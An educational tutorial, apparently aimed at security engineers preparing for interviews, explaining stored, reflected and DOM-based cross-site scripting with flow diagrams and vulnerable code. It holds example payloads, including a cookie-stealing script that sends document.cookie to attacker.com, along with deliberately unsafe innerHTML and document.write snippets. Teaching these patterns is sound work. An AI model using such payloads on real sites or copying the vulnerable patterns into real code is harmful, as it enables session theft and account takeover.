Cross-Site Scripting (XSS)
What is XSS
Cross-Site Scripting (XSS) is a vulnerability where untrusted user input becomes executable JavaScript inside another user's browser.
The core problem is:

User Input → Web Application → HTML Response → Browser
If the application includes untrusted data in the HTML response without proper encoding, the browser will execute it as part of the webpage. 
This allows attackers to:

• Steal session cookies
• Perform actions on behalf of users
• Modify page content
• Redirect users to malicious websites
• Capture sensitive data
Because the script executes inside the trusted origin of the application, the browser treats it as legitimate code.


The Fundamental Principle Behind XSS
The browser trusts where the page came from, not who wrote the data inside it.
Example:

https://bank.com/dashboard
If a malicious script appears in this page:

<script>stealCookies()</script>
the browser assumes:

This script belongs to bank.com
So it runs it with full privileges.
Those privileges include:

• Access to DOM
• Access to API responses
• Access to localStorage
• Ability to send authenticated requests
This is why XSS can lead to full account takeover.


How XSS Works Internally (Browser Execution Model)
When a browser loads a webpage:

Server Response
      │
      ▼
HTML Parser
      │
      ▼
DOM Tree Construction
      │
      ▼
JavaScript Engine Execution
Example response from server:

HTTP/1.1 200 OK

<html>
<body>

Welcome user

<script>
fetch("https://attacker.com/steal?c="+document.cookie)
</script>

</body>
</html>
Browser processing:

HTML Parser reads <script>
      │
      ▼
DOM contains executable script
      │
      ▼
JavaScript engine executes code
The browser executes the script because it is part of the page.


The Three Stages of an XSS Attack
Every XSS attack follows this flow:

1. Injection
2. Execution
3. Exploitation
Injection
The attacker inserts malicious code into an input field:

<script>alert(1)</script>
This might happen in:

• comment fields
• search boxes
• profile names
• query parameters


Execution
When the application returns that input inside HTML:

<div>
<script>alert(1)</script>
</div>
the browser executes it.


Exploitation
Once the script runs, the attacker can:

• steal cookies
• perform API requests
• modify UI
• extract sensitive data
This is the real impact.


Why XSS Is So Dangerous
XSS runs inside the victim’s browser session.
So the script can act as the user.
Example:

User logged in
      │
      ▼
XSS payload executes
      │
      ▼
Malicious API requests sent
      │
      ▼
Server thinks requests are legitimate
This can lead to:

Account takeover
Data theft
Privilege escalation


Types of XSS
There are three primary types:

1. Stored XSS
2. Reflected XSS
3. DOM-based XSS


Stored XSS (Persistent)
The malicious script is stored in the application's database.
Example locations:

• blog comments
• forum posts
• user profiles
• product reviews
Attack flow:

Attacker posts malicious comment
        │
        ▼
Application stores it in database
        │
        ▼
Victim loads page
        │
        ▼
Server returns malicious script
        │
        ▼
Browser executes it
This is extremely dangerous because every user viewing the page becomes a victim.


Reflected XSS
The malicious payload is sent in the request and reflected in the response.
Example URL:

https://example.com/search?q=<script>alert(1)</script>
Flow:

User clicks malicious link
       │
       ▼
Server reflects input
       │
       ▼
Browser executes script
This type usually requires phishing or social engineering.


DOM-Based XSS
This occurs entirely in the browser.
The server response may be safe, but client-side JavaScript introduces the vulnerability.
Example:

var query = location.search;
document.write(query);
If attacker sends:

?search=<script>alert(1)</script>
the browser executes it.


Key Takeaway
XSS occurs when:

Untrusted Input
        │
        ▼
Inserted into HTML without encoding
        │
        ▼
Browser interprets it as JavaScript


Why This Matters for Security Engineers
Understanding XSS is critical because it often leads to:

• Session hijacking
• API abuse
• OAuth token theft
• Cloud privilege escalation
Many major breaches start with a small XSS bug.


XSS Architecture Flows and Real Exploitation
This section explains how XSS actually happens inside real web architectures, not just simple examples.
Understanding these flows helps security engineers answer deep interview follow-up questions.


1. Stored XSS — Full Architecture Flow
Stored XSS occurs when malicious input is saved permanently in backend storage and later rendered to users without proper encoding.


Architecture

            Internet
               │
               ▼
           Web Browser
               │
               ▼
         Web Application
               │
        ┌──────┴───────┐
        ▼              ▼
   Application      Database
      Logic


Normal Flow
A user posts a comment.

POST /comment

{
 "comment": "Great article!"
}
Server stores the comment.

INSERT INTO comments (text)
VALUES ("Great article!")
When another user loads the page:

GET /article/123
The server fetches comments and inserts them into HTML.

<div class="comment">
Great article!
</div>


Attack Flow
Attacker submits a malicious comment.

<script>
fetch("https://attacker.com/steal?cookie="+document.cookie)
</script>
This payload is stored in the database.

INSERT INTO comments (text)
VALUES ("<script>...</script>")
Later when users load the page:

Database → Application → HTML Response → Browser
HTML returned to victim:

<div class="comment">
<script>
fetch("https://attacker.com/steal?cookie="+document.cookie)
</script>
</div>


Browser Execution
The browser processes the HTML:

HTML Parser detects <script>
        │
        ▼
JavaScript Engine executes it
        │
        ▼
Cookie sent to attacker


Why Stored XSS Is Dangerous
Because it automatically targets every visitor.
Attack chain:

Attacker posts payload
        │
        ▼
Stored in database
        │
        ▼
Victims load page
        │
        ▼
Script executes in victim browser
        │
        ▼
Session cookie stolen


2. Reflected XSS — Architecture Flow
Reflected XSS happens when user input is immediately returned in a response without sanitization.


Architecture

Browser
   │
   ▼
Web Server
   │
   ▼
Template Engine


Vulnerable Code Pattern
Search functionality.

GET /search?q=term
Backend template:

<h2>Search results for: {{query}}</h2>
If query is not encoded, the attacker can inject JavaScript.


Attack Request

https://site.com/search?q=<script>alert(1)</script>
Server response:

<h2>Search results for:
<script>alert(1)</script>
</h2>
Browser executes the script.


Why Reflected XSS Requires Social Engineering
Unlike stored XSS, the payload is not stored.
So the attacker must trick a victim into clicking a link.
Example:

Phishing email
      │
      ▼
Victim clicks malicious link
      │
      ▼
Browser loads vulnerable page
      │
      ▼
Script executes


3. DOM-Based XSS — Internal Browser Flow
DOM XSS happens when JavaScript running in the browser modifies the DOM using unsafe user input.


Architecture

Server → HTML Page
         │
         ▼
Client-side JavaScript
         │
         ▼
DOM Manipulation


Vulnerable Code

var name = location.hash;

document.getElementById("msg").innerHTML =
"Hello " + name;
If attacker sends:

https://site.com/#<script>alert(1)</script>
The JavaScript inserts it into DOM.
Resulting DOM:

<div>Hello <script>alert(1)</script></div>
The browser executes it.


Why DOM XSS Is Harder to Detect
Because:

Server response is safe
The vulnerability exists only in client-side JavaScript.
This makes automated scanners less effective.


